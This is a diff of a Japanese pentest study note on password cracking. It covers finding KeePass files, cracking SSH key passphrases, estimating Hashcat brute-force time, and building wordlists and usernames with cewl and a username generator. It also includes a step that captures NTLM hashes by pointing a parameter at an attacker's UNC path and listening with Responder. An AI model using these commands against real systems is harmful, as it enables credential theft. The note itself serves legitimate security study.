@@ -40,7 +40,7 @@ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyCont
 
 - SSHの秘密鍵で接続しようとすると、パスフレーズの入力を求められる
 - `id_rsa`からHashを抽出し、クラックする
-- ⚠️外部から入手した`id_rsa`ファイルには、読み・書き権限を付与すること
+- 外部から入手した`id_rsa`ファイルには、読み・書き権限を付与すること
 ```zsh
 chmod 600 id_rsa
 ```
@@ -48,21 +48,23 @@ chmod 600 id_rsa
 ## 2. Hashのフォーマット化
 
 - まずはHashアルゴリズムを識別する必要がある：
-	- [🐈‍⬛Password Crack - JtR・Hashcat](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#Hashの識別)
+	- [Hashの識別](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#Hashの識別)
 
 - sshパスフレーズ、zip、rar、/etc/shadowなど、必要に応じてフォーマットツールを使いフォーマット化する：
-	- [🐈‍⬛Password Crack - JtR・Hashcat](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#ハッシュ値の整形)
+	- [ハッシュ値の整形](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#ハッシュ値の整形)
 
 ## 3. クラッキング所要時間の計算
 
-目的：
-	限られた時間の中で、**総当たりの**クラッキングが終わりそうかを判断する。
-	終わらないのであれば、==別の攻撃ベクターを模索する。==
-		※辞書攻撃であれば実施不要
+目的は、限られた時間の中で、**総当たりの**クラッキングが終わりそうかを判断すること。
+終わらないのであれば、==別の攻撃ベクターを模索する。==
+※標準的なサイズのワードリストを用いた辞書攻撃であれば、計算不要
 
-💡以下の手順をスキップして、Hashcatでクラッキングを走らせ、statusを表示する方法もある
+以下の手順をスキップして、Hashcatでクラッキングを走らせ、statusを表示する方法もある。
+
 ![](../../画像ファイル/Pasted%20image%2020250720131350.png)
+
 $$所用推定時間$$
+
 ### 3-1. Key Space（※）を求める
 
 - （※）指定可能な文字の組合せ数（文字の数^文字長）
@@ -131,7 +133,7 @@ Speed.#1.........:   134.2 MH/s (7.63ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
 - 基本シンタックス
 	- 秒単位の結果が返る
 ```zsh
-python3 -c "print([Key Space] / [MH/s])"
+python3 -c "print(<Key_Space> / <MH/s>)"
 ```
 
 - 具体例：Hash-Mode 1400 (SHA2-256)
@@ -140,7 +142,7 @@ python3 -c "print(916132832 / 134200000)"
 6.826623189269746
 ```
 
-#### 補足：文字長を大きくする vs 文字種を増やす
+#### 補足：「文字長を大きくする」のと「文字種を増やす」のはどちらがセキュアか
 
 - 文字種を増やすより、文字長を大きくするほうが、パスワードのパターンが指数関数的に増加するので、より安全
 
@@ -197,8 +199,8 @@ sort combined.txt | uniq -u > cleaned_list.txt
 
 ### ワードリストの改変
 
-- [🐈‍⬛Password Crack - JtR・Hashcat](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#ワードリストの改変%20w/%20Hashcat)
-- [🐈‍⬛Password Crack - JtR・Hashcat](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#ワードリストの改変%20w/%20JtR)
+- [ワードリストの改変 w/ Hashcat](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#ワードリストの改変%20w/%20Hashcat)
+- [ワードリストの改変 w/ JtR](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#ワードリストの改変%20w/%20JtR)
 
 ### ワードリストの生成
 
@@ -216,13 +218,15 @@ cewl -e --email_file emails.txt -m 5 -w cewl.txt http://<TargetIP>
 
 - 情報収集のフェーズで、ターゲット企業の従業員の名前などを集めることは必須
 - 集めたターゲットの従業員名などからユーザー名を生成する
-- [username_generater](https://github.com/shroudri/username_generator)を使う
+- 🔗[username_generater](https://github.com/shroudri/username_generator)を使う
 ```zsh
 # wget https://raw.githubusercontent.com/shroudri/username_generator/refs/heads/main/username_generator.py
 echo "Suzuki Taro" > users.lst
 python3 username_generator.py -w users.lst
 ```
+
 ![ 500](../../画像ファイル/Pasted%20image%2020230611195317.png)
+
 $$username生成例$$
 
 #### Keyspaceテクニック
@@ -378,7 +382,9 @@ http://example/page=//<AttackerIP>/hoge
 ```
 \\\\<AttackerIP>\hoge\hoge.txt
 ```
+
 ![](../../画像ファイル/Pasted%20image%2020250720111345.png)
+
 $$filenameパラメタの値を攻撃者のIPを指すUNCパスに変更$$
 
 3. 攻撃者のResponderを確認し、ハッシュを取得したことを確認
